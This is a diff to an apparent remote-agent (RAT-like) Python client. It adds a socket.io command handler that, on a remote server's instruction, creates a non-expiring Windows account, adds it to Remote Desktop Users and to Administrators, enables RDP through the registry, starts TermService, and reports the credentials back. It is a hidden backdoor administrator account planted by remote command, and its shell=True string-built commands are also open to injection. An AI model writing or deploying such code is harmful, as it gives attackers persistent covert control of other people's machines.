@@ -409,7 +409,79 @@ class RemoteAgent:
                     'error': str(e),
                     'command_id': data.get('command_id')
                 })
+        
+        @self.sio.event
+        def create_rdp_account(data):
+            username = data.get('username')
+            password = data.get('password')
+            command_id = data.get('command_id')
+            print(f"[AGENT] Creating RDP account: {username}")
+            
+            result = {
+                'status': 'error',
+                'username': username,
+                'password': password,
+                'error': 'Unknown error',
+                'command_id': command_id
+            }
+            
+            if platform.system() != 'Windows':
+                result['error'] = 'RDP account creation only supported on Windows'
+                self.sio.emit('rdp_account_result', result)
+                return
+            
+            try:
+                # Create local user
+                create_cmd = f'net user "{username}" "{password}" /add /expires:never /passwordchg:no'
+                create_result = subprocess.run(create_cmd, shell=True, capture_output=True, text=True, timeout=30)
                 
+                if create_result.returncode != 0:
+                    # Check if user already exists
+                    if 'already exists' in create_result.stderr.lower():
+                        result['status'] = 'success'
+                        result['error'] = None
+                    else:
+                        result['error'] = create_result.stderr or create_result.stdout or 'Failed to create user'
+                        self.sio.emit('rdp_account_result', result)
+                        return
+                else:
+                    result['status'] = 'success'
+                    result['error'] = None
+                
+                # Add to Remote Desktop Users group
+                group_cmd = f'net localgroup "Remote Desktop Users" "{username}" /add'
+                group_result = subprocess.run(group_cmd, shell=True, capture_output=True, text=True, timeout=30)
+                
+                if group_result.returncode != 0 and 'already exists' not in group_result.stderr.lower():
+                    print(f"[AGENT] Warning: Failed to add user to RDP group: {group_result.stderr}")
+                
+                # Enable RDP if not already enabled
+                reg_cmd = 'reg add "HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f'
+                reg_result = subprocess.run(reg_cmd, shell=True, capture_output=True, text=True, timeout=30)
+                
+                if reg_result.returncode != 0:
+                    print(f"[AGENT] Warning: Failed to enable RDP: {reg_result.stderr}")
+                
+                # Ensure Remote Desktop Services is running
+                sc_cmd = 'sc config TermService start= auto'
+                sc_result = subprocess.run(sc_cmd, shell=True, capture_output=True, text=True, timeout=30)
+                
+                start_cmd = 'sc start TermService'
+                start_result = subprocess.run(start_cmd, shell=True, capture_output=True, text=True, timeout=30)
+                
+                # Add to local Administrators group for full access (optional, can be removed)
+                admin_cmd = f'net localgroup Administrators "{username}" /add'
+                admin_result = subprocess.run(admin_cmd, shell=True, capture_output=True, text=True, timeout=30)
+                
+                print(f"[AGENT] RDP account created successfully: {username}")
+                
+            except subprocess.TimeoutExpired:
+                result['error'] = 'Command timed out'
+            except Exception as e:
+                result['error'] = str(e)
+            
+            self.sio.emit('rdp_account_result', result)
+               
     def connect(self):
         while True:
             try:
